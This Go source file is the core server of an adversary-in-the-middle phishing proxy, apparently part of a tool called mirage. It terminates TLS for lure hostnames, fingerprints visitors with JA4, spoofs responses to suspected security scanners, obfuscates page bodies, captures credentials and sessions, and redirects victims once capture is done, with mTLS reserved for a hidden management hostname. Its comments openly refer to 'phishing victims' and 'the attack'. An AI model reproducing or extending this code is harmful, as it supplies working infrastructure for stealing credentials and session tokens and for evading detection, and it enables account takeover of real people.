package proxy

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"io"
	"log/slog"
	"net"
	"net/http"
	"strings"
	"time"

	"github.com/travisbale/mirage/internal/aitm"
)

const upstreamTimeout = 30 * time.Second

type certSource interface {
	GetCertificate(hello *tls.ClientHelloInfo) (*tls.Certificate, error)
}

// Service interfaces consumed by Server and connection.

type spoofer interface {
	Spoof(w http.ResponseWriter, r *http.Request)
	SpoofTarget(w http.ResponseWriter, r *http.Request, spoofURL string)
}

type botEvaluator interface {
	Evaluate(ja4 string, telemetry *aitm.BotTelemetry) aitm.BotVerdict
}

type ipBlocker interface {
	IsBlocked(ip string) bool
}

type phishletResolver interface {
	ResolveHostname(hostname, urlPath string) (*aitm.Phishlet, *aitm.Lure, error)
}

type sessionManager interface {
	Get(id string) (*aitm.Session, error)
	NewSession(clientIP, ja4Hash, userAgent, lureID, phishletName string) (*aitm.Session, error)
	Update(session *aitm.Session) error
	Complete(session *aitm.Session) error
	IsComplete(sess *aitm.Session, def *aitm.Phishlet) bool
	CaptureCredentials(session *aitm.Session) error
}

type temporaryWhitelister interface {
	WhitelistTemporary(ip string, dur time.Duration)
}

type puppetOverrideSource interface {
	GetOverride(phishletName string) string
}

type telemetryScorer interface {
	ScoreSession(sessionID string) float64
	StoreTelemetry(t *aitm.BotTelemetry) error
}

type bodyObfuscator interface {
	Obfuscate(ctx context.Context, html []byte) ([]byte, error)
}

type redirectNotifier interface {
	WaitForRedirect(w http.ResponseWriter, r *http.Request, sessionID string)
	PollForRedirect(w http.ResponseWriter, sessionID string)
}

// Server is a reverse-proxy HTTPS server.
// It accepts raw TCP connections on port 443, peeks at the TLS ClientHello
// to capture bytes for JA4 fingerprinting, completes the TLS handshake using
// the SNI hostname to select the right certificate, then creates a
// connection for each victim and handles HTTP requests.
type Server struct {
	// Addr is the TCP address to listen on, e.g. ":443".
	Addr string

	// CertSource provides TLS certificates for incoming connections.
	// The GetCertificate callback is invoked during each TLS handshake
	// with the SNI hostname from the ClientHello.
	CertSource certSource

	// ClientCAs specifies the certificate authority pool used to verify
	// client certificates for the management API. Only connections to
	// SecretHostname require a client certificate; phishing victims are
	// never prompted.
	ClientCAs *x509.CertPool

	// SecretHostname is the SNI hostname that triggers mTLS for the
	// management API. Requests to this hostname are routed to APIHandler
	// instead of the phishing pipeline. If empty, mTLS is disabled.
	SecretHostname string

	// UpstreamTransport optionally specifies the http.RoundTripper used
	// for requests to upstream (legitimate) servers. If nil, Serve creates
	// a default http.Transport with sensible timeouts and TLS verification
	// enabled. Set this in tests to intercept or stub upstream traffic
	// without making real network calls.
	UpstreamTransport http.RoundTripper

	// Notifier delivers session-completion signals to victim browsers,
	// triggering the post-capture redirect.
	Notifier redirectNotifier

	// APIHandler serves management API requests on SecretHostname.
	APIHandler http.Handler

	// upstreamClient is the HTTP client used to forward requests to
	// legitimate servers. Built automatically by ListenAndServe from
	// UpstreamTransport.
	upstreamClient *http.Client

	// Logger is used for structured logging throughout the proxy.
	// If nil, the server will panic on first log call.
	Logger *slog.Logger

	// ScoreThreshold is the bot detection score above which a connection
	// is spoofed. Telemetry scores are accumulated per-session and checked
	// on each request. Values typically range from 0.0 (human) to 1.0 (bot).
	ScoreThreshold float64

	// TrustedCIDRs lists upstream proxy/CDN networks whose X-Forwarded-For
	// and True-Client-IP headers are trusted for client IP extraction.
	// If empty, the client IP is taken from the TCP connection's remote address.
	TrustedCIDRs []*net.IPNet

	// Services
	BotGuard     botEvaluator
	Blacklist    ipBlocker
	Spoofer      spoofer
	PhishletSvc  phishletResolver
	SessionSvc   sessionManager
	PuppetSvc    puppetOverrideSource
	TelemetrySvc telemetryScorer
	Obfuscator   bodyObfuscator
}

// ListenAndServe listens on s.Addr and blocks until ctx is cancelled.
func (s *Server) ListenAndServe(ctx context.Context) error {
	// Build the upstream HTTP client once before accepting connections.
	transport := s.UpstreamTransport
	if transport == nil {
		transport = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec // upstream is the target site; its cert is irrelevant to the attack
			DialContext: (&net.Dialer{
				Timeout:   upstreamTimeout,
				KeepAlive: upstreamTimeout,
			}).DialContext,
			ResponseHeaderTimeout: upstreamTimeout,
		}
	}
	s.upstreamClient = &http.Client{
		Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	listener, err := net.Listen("tcp", s.Addr)
	if err != nil {
		return fmt.Errorf("aitm: listen %s: %w", s.Addr, err)
	}

	s.Logger.Info("AiTM proxy listening", "addr", s.Addr)

	// Close the listener when ctx is cancelled so Accept unblocks.
	go func() {
		<-ctx.Done()
		listener.Close()
	}()

	for {
		conn, err := listener.Accept()
		if err != nil {
			select {
			case <-ctx.Done():
				return nil
			default:
				return fmt.Errorf("aitm: accept: %w", err)
			}
		}
		go s.setupConnection(ctx, conn)
	}
}

// setupConnection runs per-connection: captures ClientHello for JA4, completes TLS
// handshake with the SNI-matched cert, then creates a connection and
// serves HTTP/1.1 requests.
func (s *Server) setupConnection(ctx context.Context, rawConn net.Conn) {
	defer rawConn.Close()

	// Tee the first TLS record so JA4 can be computed from the raw ClientHello.
	peekedConn := newPeekedConn(rawConn)

	// GetConfigForClient applies mTLS only for the secret management hostname,
	// so phishing victims are never prompted for a client certificate.
	tlsConfig := &tls.Config{
		GetCertificate: s.CertSource.GetCertificate,
		GetConfigForClient: func(hello *tls.ClientHelloInfo) (*tls.Config, error) {
			if strings.EqualFold(hello.ServerName, s.SecretHostname) {
				return &tls.Config{
					GetCertificate: s.CertSource.GetCertificate,
					ClientAuth:     tls.VerifyClientCertIfGiven,
					ClientCAs:      s.ClientCAs,
				}, nil
			}
			return nil, nil
		},
	}

	tlsConn := tls.Server(peekedConn, tlsConfig)
	if err := tlsConn.Handshake(); err != nil {
		s.Logger.Debug("aitm: TLS handshake failed", "error", err)
		return
	}
	defer tlsConn.Close()

	conn := s.newConnection(tlsConn, peekedConn.ClientHelloBytes())
	conn.serve(ctx)
}

func isWebSocketUpgrade(req *http.Request) bool {
	return strings.EqualFold(req.Header.Get("Upgrade"), "websocket") &&
		strings.Contains(strings.ToLower(req.Header.Get("Connection")), "upgrade")
}

func isConnReset(err error) bool {
	return strings.Contains(err.Error(), "connection reset")
}

// bufferedResponseWriter is a minimal http.ResponseWriter that writes to a net.Conn.
type bufferedResponseWriter struct {
	conn      net.Conn
	header    http.Header
	code      int
	buf       []byte
	keepAlive bool
}

func newBufferedResponseWriter(conn net.Conn) *bufferedResponseWriter {
	return &bufferedResponseWriter{
		conn:   conn,
		header: make(http.Header),
		code:   http.StatusOK,
	}
}

func (w *bufferedResponseWriter) Header() http.Header {
	return w.header
}

func (w *bufferedResponseWriter) WriteHeader(code int) {
	w.code = code
}

func (w *bufferedResponseWriter) Write(b []byte) (int, error) {
	w.buf = append(w.buf, b...)
	return len(b), nil
}

func (w *bufferedResponseWriter) flush() {
	resp := &http.Response{
		StatusCode:    w.code,
		Header:        w.header,
		Proto:         "HTTP/1.1",
		ProtoMajor:    1,
		ProtoMinor:    1,
		Body:          io.NopCloser(bytes.NewReader(w.buf)),
		ContentLength: int64(len(w.buf)),
		Close:         !w.keepAlive,
	}
	_ = resp.Write(w.conn) // raw connection write; error unrecoverable at this point
}

// hijackableResponseWriter wraps a net.Conn and satisfies http.Hijacker for WebSocket upgrades.
type hijackableResponseWriter struct {
	conn   net.Conn
	header http.Header
	code   int
}

func newHijackableResponseWriter(conn net.Conn) *hijackableResponseWriter {
	return &hijackableResponseWriter{
		conn:   conn,
		header: make(http.Header),
		code:   http.StatusOK,
	}
}

func (w *hijackableResponseWriter) Header() http.Header {
	return w.header
}

func (w *hijackableResponseWriter) WriteHeader(code int) {
	w.code = code
}

func (w *hijackableResponseWriter) Write(b []byte) (int, error) {
	return w.conn.Write(b)
}

func (w *hijackableResponseWriter) Hijack() (net.Conn, *bufio.ReadWriter, error) {
	brw := bufio.NewReadWriter(bufio.NewReader(w.conn), bufio.NewWriter(w.conn))
	return w.conn, brw, nil
}
